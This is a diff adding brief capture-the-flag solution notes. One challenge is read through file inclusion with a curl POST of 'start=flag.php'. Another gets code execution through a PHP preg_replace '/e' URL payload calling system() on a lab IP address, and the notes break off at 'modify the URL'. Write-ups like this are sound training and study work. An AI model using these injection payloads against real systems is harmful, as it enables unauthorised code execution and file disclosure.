@@ -68,3 +68,9 @@ Alien-inclusion
 
 1. use the command curl 'link' --data 'start=flag.php'
 2. (optional) can do the same thing using burp suite and entering start=flag.php at the end as a parameter when sending a request.
+
+substitute
+
+1. http://35.246.158.241:31431/index.php?vector=/Admin/e&replace=system(‘?????????’)
+2. Found folder here_we_dont_have_flag
+3. modify the URL 
